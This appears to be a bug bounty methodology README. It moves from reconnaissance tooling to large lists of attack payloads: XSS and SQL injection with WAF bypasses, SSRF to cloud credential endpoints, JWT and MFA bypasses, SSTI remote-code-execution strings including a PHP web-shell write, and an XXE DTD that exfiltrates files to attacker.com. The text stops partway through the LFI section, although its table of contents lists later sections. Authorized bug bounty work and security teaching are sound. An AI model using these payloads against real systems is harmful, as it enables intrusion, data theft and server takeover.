<h1 align="center">&#x1F4A5; Bug Bounty Methodology &#x1F4A5;</h1>

<div align="center">
   
[![Edition](https://img.shields.io/badge/Edition-2025-blue)](#)
[![Status](https://img.shields.io/badge/Status-Live-brightgreen)](#)
[![Focus](https://img.shields.io/badge/Focus-Web%20%7C%20API%20%7C%20Cloud-red)](#)

</div>

<br>

<div align="left">

> *"The hunter who maps the terrain before the hunt never returns empty-handed."*

Bug bounty hunting isn't about running tools — it's about **understanding attack surfaces** and **thinking like an adversary**. This methodology gives you the reconnaissance backbone, the enumeration muscle, and the exploitation instinct to turn surface-level scanning into deep, impactful discoveries. The tools are just the brush. Your mind is the canvas.

No fluff. No filler. Just the workflow that finds bugs.

</div>


<br>

## 📜 Table of Contents

| # | Section | Focus |
|---|---------|-------|
| 1 | [Reconnaissance](#1-reconnaissance-and-subdomain-enumeration) | Subdomain Enumeration & Scanning |
| 2 | [Discovery](#2-discovery-and-probing) | HTTP Probing & Asset Discovery |
| 3 | [Enumeration](#3-advanced-enumeration-techniques) | Parameters, Content & API Discovery |
| **4** | [**Vulnerability Testing**](#4-vulnerability-testing) | **18 Bug Classes — Payloads & Bypasses** |
| 4.1 | ↳ [XSS](#41-cross-site-scripting-xss) | Reflected · Stored · DOM · WAF Bypass |
| 4.2 | ↳ [SQL Injection](#42-sql-injection) | Error · Union · Blind · Time · WAF Bypass |
| 4.3 | ↳ [SSRF](#43-server-side-request-forgery-ssrf) | Metadata · IP Bypass · Gopher · Blind |
| 4.4 | ↳ [IDOR & Access Control](#44-idor--broken-access-control) | ID Enumeration · Role Bypass · Mass Assignment |
| 4.5 | ↳ [Authentication Bypass](#45-authentication-bypass--jwt-attacks) | JWT · SAML · MFA Bypass · Default Creds |
| 4.6 | ↳ [CSRF](#46-cross-site-request-forgery-csrf) | SameSite Bypass · Token Bypass · JSON CSRF |
| 4.7 | ↳ [SSTI](#47-server-side-template-injection-ssti) | Jinja2 · Twig · Freemarker · ERB · Velocity |
| 4.8 | ↳ [XXE](#48-xml-external-entity-xxe) | In-Band · Blind OOB · SSRF via XXE · SVG |
| 4.9 | ↳ [LFI / RFI](#49-lfi--rfi--path-traversal) | Wrappers · Log Poisoning · Windows Paths |
| 4.10 | ↳ [File Upload](#410-file-upload-vulnerabilities) | Extension Bypass · Polyglots · ZIP Slip |
| 4.11 | ↳ [Deserialization](#411-insecure-deserialization) | Java · PHP · Python · .NET · Ruby |
| 4.12 | ↳ [Prototype Pollution](#412-prototype-pollution) | Client-Side · Server-Side · Node.js |
| 4.13 | ↳ [HTTP Smuggling](#413-http-request-smuggling) | CL.TE · TE.CL · H2.CL · TE.TE |
| 4.14 | ↳ [Cache Poisoning](#414-web-cache-poisoning--deception) | Unkeyed Headers · Web Cache Deception |
| 4.15 | ↳ [Race Conditions](#415-race-conditions--toctou) | Single-Packet · TOCTOU · Rate Limit Bypass |
| 4.16 | ↳ [Business Logic](#416-business-logic-flaws) | Coupon · Price · Quantity · Payment · Trial |
| 4.17 | ↳ [Open Redirect](#417-open-redirect) | 12 Bypass Techniques · OAuth Chaining |
| 4.18 | ↳ [Information Disclosure](#418-information-disclosure--secret-leaks) | JS Secrets · .git · .env · Source Maps |
| 5 | [Two-Eye Approach](#5-the-two-eye-approach) | Hunting Methodology |
| 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Documentation & Evidence |
| 7 | [Reporting](#7-reporting) | Professional Write-ups |

---

<br>


## **1. Reconnaissance and Subdomain Enumeration**

### **1.1 Passive Subdomain Enumeration**
**🛠️Tools:** [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [CRTSH](https://crt.sh/), [Github-Search](https://github.com/gwen001/github-search)

**Subfinder**
```bash
subfinder -d target.com -silent -all -recursive -o subfinder_subs.txt
```

**Amass (Passive Mode)**
```bash
amass enum -passive -d target.com -o amass_passive_subs.txt
```

**CRT.sh Query**
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew crtsh_subs.txt
```

**Github Dorking**
```bash
github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github_subs.txt
```

**Results Combination**
```bash
cat *_subs.txt | sort -u | anew all_subs.txt
```

### **1.2 Active Subdomain Enumeration**

**🛠️Tools:** [MassDNS](https://github.com/blechschmidt/massdns), [Shuffledns](https://github.com/projectdiscovery/shuffledns), [DNSX](https://github.com/projectdiscovery/dnsx), [SubBrute](https://github.com/TheRook/subbrute), [FFuF](https://github.com/ffuf/ffuf)

**MassDNS**
```bash
massdns -r resolvers.txt -t A -o S -w massdns_results.txt wordlist.txt
```

**Shuffledns**
```bash
shuffledns -d target.com -list all_subs.txt -r resolvers.txt -o active_subs.txt
```

**DNSX Resolution**
```bash
dnsx -l active_subs.txt -resp -o resolved_subs.txt
```

**SubBrute**
```bash
python3 subbrute.py target.com -w wordlist.txt -o brute_force_subs.txt
```

**FFuF Subdomain**
```bash
ffuf -u https://FUZZ.target.com -w wordlist.txt -t 50 -mc 200,403 -o ffuf_subs.txt
```

### **1.3 Handling Specific (Non-Wildcard) Targets**

**🛠️Tools:** [GAU](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Katana](https://github.com/projectdiscovery/katana), [Hakrawler](https://github.com/hakluke/hakrawler)

**GAU**
```bash
gau target.example.com | anew gau_results.txt
```

**Waybackurls**
```bash
waybackurls target.example.com | anew wayback_results.txt
```

**Katana**
```bash
katana -u target.example.com -silent -jc -o katana_results.txt
```

**Hakrawler**
```bash
echo "https://target.example.com" | hakrawler -depth 2 -plain -js -out hakrawler_results.txt
```

### **Additional Advanced Techniques**

**🛠️Tools:** [CloudEnum](https://github.com/initstring/cloud_enum), [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump), [S3Scanner](https://github.com/sa7mon/S3Scanner)

**Reverse DNS**
```bash
dnsx -ptr -l resolved_subs.txt -resp-only -o reverse_dns.txt
```

**ASN Enumeration**
```bash
amass intel -asn <ASN_NUMBER> -o asn_results.txt
```

**Cloud Asset Enumeration**
```bash
cloud_enum -k target.com
```

**Results Validation**
```bash
cat all_subs.txt | httpx -silent -title -o live_subdomains.txt
```

---

<br>


## **2. Discovery and Probing**

### **2.1 HTTP Probing**

**🛠️Tools:** [httpx](https://github.com/projectdiscovery/httpx), [httprobe](https://github.com/tomnomnom/httprobe)

**HTTPX Probing**
```bash
httpx -l resolved_subs.txt -p 80,443,8080,8443 -silent -title -sc -ip -o live_websites.txt
```

**Custom Filtering**
```bash
cat live_websites.txt | grep -i "login\|admin" | tee login_endpoints.txt
```

### **2.2 JavaScript Analysis**

**🛠️Tools:** [LinkFinder](https://github.com/GerbenJavado/LinkFinder), [subjs](https://github.com/lc/subjs), [JSFinder](https://github.com/Threezh1/JSFinder), [GF](https://github.com/tomnomnom/gf)

**JS Extraction**
```bash
cat live_websites.txt | waybackurls | grep "\.js" | anew js_files.txt
```

**LinkFinder Analysis**
```bash
python3 linkfinder.py -i js_files.txt -o js_endpoints.txt
```

**Sensitive Pattern Search**
```bash
cat js_files.txt | gf aws-keys | tee aws_keys.txt
cat js_files.txt | gf urls | tee sensitive_urls.txt
```

**API Key Validation**
```bash
curl -X GET "https://api.example.com/resource" -H "Authorization: Bearer <extracted_key>"
```

### **2.3 Advanced Google Dorking**

**🛠️Tools:** [GitDorker](https://github.com/obheda12/GitDorker)

**Automated Dorking**
```bash
python3 GitDorker.py -tf <github_token.txt> -q target.com -d dorks.txt -o git_dorks_output.txt
```

**Admin/Login Files**
```bash
site:*.example.com inurl:"*admin | login" | inurl:.php | .asp
```

**Config Files**
```bash
site:*.example.com ext:env | ext:yaml | ext:ini
```

**Public Keys**
```bash
site:*.example.com inurl:"id_rsa.pub" | inurl:".pem"
```

### **2.4 URL Discovery**

**🛠️Tools:** [Katana](https://github.com/projectdiscovery/katana), [Gospider](https://github.com/jaeles-project/gospider), [Hakrawler](https://github.com/hakluke/hakrawler)

**Katana Crawling**
```bash
katana -list live_websites.txt -jc -o katana_urls.txt
```

**Gospider**
```bash
gospider -s "https://target.com" -d 2 -o gospider_output/
```

**Hakrawler**
```bash
echo "https://target.com" | hakrawler -depth 3 -plain -out hakrawler_results.txt
```

### **2.5 Archive Enumeration**

**🛠️Tools:** [GAU](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [ParamSpider](https://github.com/devanshbatham/ParamSpider)

**Archive URL Collection**
```bash
gau --subs target.com | anew archived_urls.txt
waybackurls target.com | anew wayback_urls.txt
```

**Parameter Extraction**
```bash
cat archived_urls.txt | grep "=" | anew parameters.txt
```

---

<br>


## **3. Advanced Enumeration Techniques**

### **3.1 Parameter Discovery**

**🛠️Tools:** [Arjun](https://github.com/s0md3v/Arjun), [ParamSpider](https://github.com/devanshbatham/ParamSpider), [FFuF](https://github.com/ffuf/ffuf)

**Arjun Parameter Discovery**
```bash
arjun -u "https://target.example.com" -m GET,POST --stable -o params.json
```

**ParamSpider Web Parameters**
```bash
python3 paramspider.py --domain target.com --exclude woff,css,js --output paramspider_output.txt
```

**FFuF Parameter Bruteforce**
```bash
ffuf -u https://target.com/page.php?FUZZ=test -w /usr/share/wordlists/params.txt -o parameter_results.txt
```

### **3.2 Cloud Asset Enumeration**

**🛠️Tools:** [CloudEnum](https://github.com/initstring/cloud_enum), [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump), [S3Scanner](https://github.com/sa7mon/S3Scanner)

**Cloud Bucket Enumeration**
```bash
cloud_enum -k target.com -b buckets.txt -o cloud_enum_results.txt
```

**S3 Bucket Access Test**
```bash
aws s3 ls s3://<bucket_name> --no-sign-request
```

**S3 Bucket Content Dump**
```bash
python3 AWSBucketDump.py -b target-bucket -o dumped_data/
```

### **3.3 Content Discovery**

**🛠️Tools:** [Feroxbuster](https://github.com/epi052/feroxbuster), [FFuF](https://github.com/ffuf/ffuf), [Dirsearch](https://github.com/maurosoria/dirsearch)

**Feroxbuster**
```bash
feroxbuster -u https://target.com -w /usr/share/wordlists/common.txt -r -t 20 -o recursive_results.txt
```

**Dirsearch**
```bash
dirsearch -u https://target.com -w /usr/share/wordlists/content_discovery.txt -e php,html,js,json -x 404 -o dirsearch_results.txt
```

**FFuF Recursive**
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/content_discovery.txt -mc 200,403 -recursion -recursion-depth 3 -o ffuf_results.txt
```

### **3.4 API Enumeration**

**🛠️Tools:** [Kiterunner](https://github.com/assetnote/kiterunner), [Postman](https://www.postman.com/), [Burp Suite](https://portswigger.net/burp)

**Kiterunner**
```bash
kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite -o api_routes.txt
```

### **3.5 ASN Mapping**

**🛠️Tools:** [Amass](https://github.com/OWASP/Amass), [Shodan](https://www.shodan.io/), [Censys](https://censys.io/)

**ASN Lookup**
```bash
amass intel -asn <ASN_Number> -o asn_ips.txt
```

**Shodan Enumeration**
```bash
shodan search "net:<ip_range>" --fields ip_str,port --limit 100
```

**Censys Asset Search**
```bash
censys search "autonomous_system.asn:<ASN_Number>" -o censys_assets.txt
```

---

<br>


## **4. Vulnerability Testing**

> *"The difference between a scanner and a hunter is knowing what to do when the payload lands."*

---

### **4.1 Cross-Site Scripting (XSS)**

**🛠️ Tools:** [Dalfox](https://github.com/hahwul/dalfox), [XSStrike](https://github.com/s0md3v/XSStrike), [kxss](https://github.com/Emoe/kxss), [Gxss](https://github.com/KathanP19/Gxss)

**Reflected & Stored — Probe Payloads**
```bash
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'-alert(document.cookie)-'
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
```

**DOM-Based — Sinks to Search in JS**
```bash
cat js_files.txt | grep -E "(innerHTML|outerHTML|document\.write|document\.writeln|eval\(|setTimeout\(|setInterval\(|location\.hash|location\.search|\.src\s*=)"
```

**WAF Bypass — Encoding & Obfuscation**
```bash
# URL encoded
%3Cscript%3Ealert(1)%3C%2Fscript%3E

# Tag splitting / tag confusion
<scr<script>ipt>alert(1)</scr</script>ipt>
<A HrEf="jAvAsCrIpT:alert(1)">

# HTML entity encoding
<img src=x onerror=&#97;lert(1)>

# Null byte injection
<scri%00pt>alert(1)</script>

# Polyglot (works across HTML/JS/CSS contexts)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

# CSP-safe — AngularJS sandbox escape
{{constructor.constructor('alert(1)')()}}

# Not-so-well-known XSS sinks
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

**Automated Scanning**
```bash
echo "https://target.com?q=test" | kxss | tee xss_candidates.txt
cat parameters.txt | grep "=" | qsreplace "xsstest<>" | dalfox pipe --silence --skip-bav -o dalfox_results.txt
cat parameters.txt | qsreplace '"><img src=x onerror=alert(1)>' | while read url; do curl -s "$url" | grep -q "<img src=x onerror=alert(1)>" && echo "[REFLECTED] $url"; done
```

---

### **4.2 SQL Injection**

**🛠️ Tools:** [sqlmap](https://github.com/sqlmapproject/sqlmap), [ghauri](https://github.com/r0oth3x49/ghauri), [NoSQLMap](https://github.com/codingo/NoSQLMap)

**Error-Based Probes**
```bash
'
"
1'
1"
1' OR '1'='1
1' OR '1'='1'--
1' AND 1=1--
1' AND 1=2--
1' ORDER BY 1-- -
1' ORDER BY 100-- -
```

**Union-Based Payloads — Column Count**
```bash
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--
1' UNION SELECT NULL,NULL,NULL,NULL--
# Once column count found, extract data:
1' UNION SELECT username,password,NULL FROM users--
1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

**Blind Boolean-Based**
```bash
1' AND 1=1--   # True response
1' AND 1=2--   # False response
1' AND SUBSTRING((SELECT database()),1,1)='a
```

**Blind Time-Based**
```bash
# MySQL
1' OR SLEEP(5)--
1' AND (SELECT SLEEP(5))--

# PostgreSQL
1' OR pg_sleep(5)--
1' AND (SELECT pg_sleep(5))--

# MSSQL
1'; WAITFOR DELAY '0:0:5'--
1' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0; WAITFOR DELAY '0:0:5'--

# Oracle
1' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--
```

**NoSQL Injection (MongoDB)**
```bash
Content-Type: application/json

# Operator injection
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$ne":null},"password":{"$ne":null}}
{"$where":"sleep(5000)"}
{"username":"admin","password":{"$regex":"^a"}}

# URL-encoded NoSQLi
?username[$gt]=&password[$gt]=
?username[$ne]=&password[$ne]=
?username[$regex]=^a&password[$ne]=
```

**WAF Bypass Techniques**
```bash
# Comment injection
1'/**/UNION/**/SELECT/**/NULL--

# Case variation
1' UnIoN sElEcT NULL--

# URL double encoding
1%2527%20UNION%20SELECT

# Whitespace alternatives
1'%09UNION%0ASELECT%09NULL--
1'+UNION+SELECT

# Null byte before SQL keyword
1' %00 UNION SELECT NULL--

# Equivalent function replacements
# SLEEP() → BENCHMARK(5000000,MD5('a'))
# @@version → VERSION()

# Hex/char encoding
1' UNION SELECT CHAR(117,115,101,114)--
```

**Automated Scanning**
```bash
sqlmap -u "https://target.com/page?id=1" --batch --dbs --random-agent
sqlmap -u "https://target.com/page?id=1" --tamper=between,space2comment,randomcase --batch
cat parameters.txt | while read url; do sqlmap -u "$url" --batch --level=3 --risk=3 --smart; done
ghauri -u "https://target.com?id=1" --dbs --batch
```

---

### **4.3 Server-Side Request Forgery (SSRF)**

**🛠️ Tools:** [interactsh](https://github.com/projectdiscovery/interactsh), Burp Collaborator

**Cloud Metadata Endpoints**
```bash
# AWS (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# AWS (IMDSv2 — requires token, rare via SSRF)
# PUT http://169.254.169.254/latest/api/token (X-aws-ec2-metadata-token-ttl-seconds: 21600)
# GET  http://169.254.169.254/latest/meta-data/ (X-aws-ec2-metadata-token: TOKEN)

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# (requires header: Metadata-Flavor: Google)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# (requires header: Metadata: true)

# DigitalOcean
http://169.254.169.254/metadata/v1.json

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/

# Kubernetes
http://169.254.169.254/latest/meta-data/kube-env
https://kubernetes.default.svc
```

**IP Bypass (11 Techniques)**
```bash
# 1. IPv6
http://[::1]
http://[::ffff:127.0.0.1]
http://[::ffff:169.254.169.254]

# 2. Hex IP
http://0x7f000001          # 127.0.0.1

# 3. Decimal IP
http://2130706433           # 127.0.0.1

# 4. Octal IP
http://0177.0.0.1

# 5. Short-form dotless
http://127.1

# 6. DNS Rebinding
http://7f000001.127.0.0.1.nip.io
http://make-169-254-169-254.rr.nu

# 7. URL parser confusion
http://target.com@evil.com
http://evil.com#@target.com

# 8. 302 Redirect
# Host a redirect from your server: yourserver.com/redir → 169.254.169.254

# 9. Short URL services
http://bit.ly/xxxxx    # that redirects to 169.254.169.254

# 10. Enclosed alphanumeric
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ

# 11. DNS A record pointing to 127.0.0.1
```

**Protocol Smuggling**
```bash
# Gopher → Redis RCE
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...

# Gopher → MySQL auth bypass
gopher://127.0.0.1:3306/_...

# Dict protocol
dict://127.0.0.1:6379/info

# File scheme
file:///etc/passwd

# FTP (rare but possible)
ftp://evil.com:21/
```

**Blind SSRF — OOB Confirmation**
```bash
cat urls.txt | grep -E "url=|path=|redirect=|callback=|webhook=|proxy=|uri=|host=|fetch=|load=" | qsreplace "http://YOUR-COLLABORATOR.oastify.com" | xargs -I@ curl -s @
```

**Internal Port Scan via SSRF**
```bash
for port in 22 80 443 3306 5432 6379 8080 8443 9090 27017 9200; do
  curl -s -w "%{http_code} %{time_total}" --connect-timeout 3 "$ssrf_url?target=http://127.0.0.1:$port" 
done
```

---

### **4.4 IDOR & Broken Access Control**

**🛠️ Tools:** [Autorize](https://github.com/Quitten/Autorize) (Burp), [AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix)

**ID Enumeration — The Hunt**
```bash
# Sequential IDs
GET /api/user/1/profile  → GET /api/user/2/profile → GET /api/user/100/profile
GET /api/order/202301?invoice_id=42 → ?invoice_id=43
GET /download?file=report-001.pdf → ?file=report-002.pdf

# UUID/Base64 IDs — harvest from JS first
cat js_files.txt | grep -oE "[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}" | anew uuids.txt

# Hash-based IDs — test for predictability
# If id=md5(username), generate your own
echo -n "admin" | md5sum
# Use that ID to access admin resources
```

**Mass Assignment & Parameter Pollution**
```bash
# Add privileged fields to profile updates
POST /api/user/update
{
  "email":"victim@test.com",
  "role":"admin",
  "isAdmin":true,
  "verified":true,
  "plan":"enterprise",
  "credit":10000
}

# Null/Undefined bypass
{"email":"test@test.com","role":null}
{"email":"test@test.com","role":undefined}

# Array wrapping
{"email":["test@test.com","admin@target.com"]}
{"user_id":[1,2]}

# Parameter pollution — both get processed?
POST /api/transfer?to=attacker&amount=1
Body: to=victim&amount=999999
```

**Forced Browsing — Admin Gems**
```bash
cat live_websites.txt | while read url; do
  for path in "admin" "console" "dashboard" "manager" "panel" "administrator" "api/docs" "swagger" "graphql" "actuator" "phpmyadmin" "phpinfo.php" "server-status"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url/$path")
    [ "$code" != "404" ] && echo "[$code] $url/$path"
  done
done
```

---

### **4.5 Authentication Bypass & JWT Attacks**

**🛠️ Tools:** [jwt_tool](https://github.com/ticarpi/jwt_tool), [jwt-cracker](https://github.com/lmammino/jwt-cracker), SAML Raider (Burp)

**JWT Attack Matrix**
```bash
# Decode and inspect
jwt_tool <token>
# Look for weak algorithm configs

# 1. alg=none — strip signature
jwt_tool <token> -X a
# Manual: {"alg":"none","typ":"JWT"}.eyJhZG1pbiI6dHJ1ZX0.

# 2. Weak HMAC secret brute force
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# 3. kid header — path traversal
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# The server reads /etc/passwd as the HMAC secret
jwt_tool <token> -T -kc "../../../../etc/passwd"

# 4. kid header — SQL injection
# {"alg":"HS256","kid":"x' UNION SELECT 'mysecret'--"}
jwt_tool <token> -T -kc "mysecret"

# 5. JWK injection — embed your own RSA key
# {"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
jwt_tool <token> -X i

# 6. Algorithm confusion — RS256 → HS256
# If server uses RSA public key, but accepts HS256,
# HMAC-sign with the public key as secret
jwt_tool <token> -X k -pk public.pem
```

**MFA/2FA Bypass (7 Patterns)**
```bash
# 1. Direct navigation — skip MFA page after password auth
# Login → capture session cookie → go directly to:
GET /dashboard
GET /api/me
GET /settings
GET /billing

# 2. MFA not enforced on sensitive endpoints
POST /api/password/change
POST /api/email/change  
GET /api/backup-codes

# 3. OTP brute force — 6-digit with no rate limit
ffuf -u https://target.com/mfa/verify -X POST \
  -H "Cookie: session=..." \
  -d '{"code":"FUZZ"}' \
  -w <(seq -w 000000 999999)

# 4. OTP replay — same code accepted multiple times

# 5. Response manipulation
# Server returns {"verified":false} → change to {"verified":true}

# 6. Recovery code enumeration via API
GET /api/user/recovery-codes

# 7. Backup factor downgrade from TOTP to SMS (weaker)
```

**SAML Attacks**
```bash
# Signature stripping — remove <ds:Signature> element entirely
# Many parsers don't enforce signature validation!

# XML Signature Wrapping (XSW1-XSW8)
# Insert a second, malicious assertion while keeping the original signature valid
# See: https://github.com/CompassSecurity/SAMLRaider

# Comment injection in NameID
admin@target.com<!--attacker_note-->@evil.com
# Some parsers resolve to admin@target.com

# Token recipient confusion — use token from app-A on app-B
```

**Login Bypass Classics**
```bash
# Default credentials
admin:admin, admin:password, admin:admin123, root:root, guest:guest

# SQL auth bypass
username: admin' OR '1'='1'--
password: anything

# LDAP injection auth bypass
username: *
password: *
# or: username: admin)(&)
# or: (|(user=*)(password=*))

# NoSQL auth bypass
{"username":{"$gt":""},"password":{"$gt":""}}
```

---

### **4.6 Cross-Site Request Forgery (CSRF)**

**🛠️ Tools:** Burp Suite CSRF PoC Generator

**Detection — Missing Token**
```bash
# Check if CSRF token is present in state-changing requests
curl -s "https://target.com/profile/edit" | grep -i "csrf\|_token\|authenticity_token\|nonce"
```

**Bypass Techniques**
```bash
# 1. Blank/empty token
csrf_token=
csrf_token=undefined
csrf_token=null

# 2. Token not tied to session
# Use your account's CSRF token in the attack

# 3. SameSite=Lax bypass
# If XSS exists on sub.domain.com, CSRF works cross-subdomain
# If app uses GET for mutations, top-level navigation carries cookies

# 4. GET-based mutations (no CSRF token needed)
<img src="https://target.com/api/delete/account">
<img src="https://target.com/api/email/change?email=attacker@evil.com">

# 5. JSON CSRF via text/plain + form
<html>
<form action="https://target.com/api/email/change" method="POST" enctype="text/plain">
<input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
</html>

# 6. Flash-based CSRF (legacy, still works on old browsers)
```

**GraphQL CSRF**
```bash
# Many GraphQL endpoints accept GET for mutations
GET /graphql?query=mutation{deleteUser(id:1)}
```

---

### **4.7 Server-Side Template Injection (SSTI)**

**🛠️ Tools:** [tplmap](https://github.com/epinna/tplmap), [SSTImap](https://github.com/vladko312/SSTImap)

**Fingerprinting — Math Test**
```bash
{{7*7}}        # Jinja2/Twig: 49
${7*7}         # Freemarker: 49
<%= 7*7 %>     # ERB: 49
${{7*7}}       # Velocity: 49
#{7*7}         # Thymeleaf: 49
{7*7}          # Smarty/Mako: 49
```

**RCE Payloads by Engine**
```python
# === Jinja2 (Python/Flask) ===
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}

# === Twig (PHP/Symfony) ===
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|map('passthru')}}
{{['id']|filter('system')}}

# === Freemarker (Java) ===
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
${"freemarker.template.utility.Execute"?new()("whoami")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder","id").start()}

# === ERB (Ruby) ===
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").readlines() %>

# === Velocity (Java) ===
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
$rt.getRuntime().exec('id')
#set($str=$x.class.forName('java.lang.String'))##

# === Spring/Thymeleaf (Java) ===
*{T(java.lang.Runtime).getRuntime().exec('id')}

# === Smarty (PHP) ===
{php}system('id');{/php}
{system('id')}
{$smarty.template_object->smarty->_write_file(["/tmp/shell.php"], ["<?php system(\$_GET['c']);?>"])}

# === Mako (Python) ===
<%
import os
os.system("id")
%>

# === Pug/Jade (Node.js) ===
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
```

**Automated SSTI Discovery**
```bash
cat parameters.txt | qsreplace "{{7*7}}" | while read url; do
  response=$(curl -s "$url")
  echo "$response" | grep -q "49" && echo "[SSTI CONFIRMED] $url → engine returned 49"
done

python3 sstimap.py -u "https://target.com/?q=test" --os-shell
```

---

### **4.8 XML External Entity (XXE)**

**🛠️ Tools:** XXEinjector, Burp Collaborator

**Detection — Always Send XML Content-Type**
```http
Content-Type: application/xml
```

**In-Band XXE — File Read**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Blind OOB XXE — DNS/HTTP Callback**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com/xxe_test">
  %xxe;
]>
<root>test</root>
```

**Blind XXE — Data Exfiltration**
```xml
<!-- evil.dtd hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

<!-- Malicious XML sent to target -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**SSRF via XXE**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

**XInclude — When DOCTYPE is Blocked**
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

**File Upload XXE Vectors**
```xml
<!-- SVG avatar upload → XXE -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
  <text x="0" y="20">
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    &xxe;
  </text>
</svg>

<!-- DOCX/PPTX/XLSX → XXE -->
# Unzip the office file, inject XXE into xml files, rezip
# These are just ZIP archives with XML inside
```

**Error-Based XXE (when no output reflected)**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/nonexistent">
  %file;
]>
# Error message may reveal file path or content
```

---

### **4.9 LFI / RFI / Path Traversal**

**🛠️ Tools:** [LFISuite](https://github.com/D35m0nd142/LFISuite), [dotdotpwn](https://github.com/wireghoul/dotdotpwn), [ffuf](https://github.com/ffuf/ffuf)

**Path Traversal Fuzzing Payloads**
```bash
/etc/passwd
../../../../etc/passwd
....//....//....//....//etc/passwd    # Nested traversal
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
../../../../etc/passwd%00.jpg         # Null byte bypass
../../../etc/passwd%2500              # Double URL-encoded null
..\..\..\windows\win.ini              # Windows
..%5c..%5c..%5cwindows%5cwin.ini
../../../../proc/self/environ         # Env vars via proc
../../../../proc/self/cmdline
../../../../proc/self/fd/0            # Stdin
../../../../proc/self/fd/1            # Stdout
../../../../proc/self/fd/2            # Stderr
```

**PHP Wrappers — File Read → RCE**
```bash
# php://filter — read source code in base64
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
php://filter/zlib.deflate/convert.base64-encode/resource=index.php

# php://input — RCE via POST body
# URL: /page.php?file=php://input
# POST body: <?php system('id'); ?>
